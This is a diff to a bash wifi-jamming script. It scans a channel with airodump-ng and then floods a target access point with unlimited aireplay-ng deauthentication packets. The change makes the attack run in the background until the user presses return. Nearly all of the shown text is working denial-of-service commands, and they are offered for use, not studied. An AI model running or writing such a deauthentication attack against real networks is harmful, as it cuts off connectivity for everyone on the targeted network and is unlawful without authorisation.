@@ -48,8 +48,7 @@ echo You may wish to enlarge your terminal window so longer wifi names are not t
 read
 
 ## Scan on designated channel for devices and sets interface to look on said channel
-airodump-ng -c $channel $interface & 
-SCANPID=$!
+airodump-ng -c $channel $interface & SCANPID=$!
 sleep 10
 kill $SCANPID
 
@@ -67,14 +66,16 @@ fi
 ##i=1
 ##while [ i -le 10 ]
 ##do
-	echo Press ctrl+c to stop the jamming
-	aireplay-ng -0 0 -a $bssid $interface
+	echo Press return to stop the jamming
+	aireplay-ng -0 0 -a $bssid $interface & ATTACKID=$!
+	read
+	kill $ATTACKID
 	## For some opening xterms with the attack command doesnt work. If it works for you uncomment it and remove the previous three lines and uncomment the while statment
 	##xterm -fn fixed -geom -0-0 -title “Sending packets ($i)” -e ‘aireplay-ng -0 0 -a $bssid $interface’ &
 	##let i=$i - 1	
 ##done
 
-##cleanup stuff. as of now it doesnt run it but if someone can help me learn how to kill aireplay-ng command it would be greatly appreciated
+##cleanup stuff
 echo Cleaning up processes, killing monitor mode, restarting network manager, reseting MAC address to default
 ifconfig $interface down
 macchanger -p $interface
